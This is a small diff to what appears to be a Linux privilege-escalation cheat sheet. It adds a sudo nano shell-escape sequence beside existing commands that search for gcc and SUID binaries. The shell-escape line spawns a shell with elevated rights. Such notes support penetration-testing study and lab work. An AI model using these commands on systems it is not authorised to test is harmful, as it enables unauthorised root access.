@@ -186,3 +186,10 @@ find / -name gcc*
 ```JavaScript
 find / -perm -u=s -type f 2>/dev/null
 ```
+
+**Privilege Escalation with Sudo**
+
+Run nano and press CTRL+R and CTRL+X. Then enter the following and press enter:
+```JavaScript
+reset; bash 1>&0 2>&0
+```
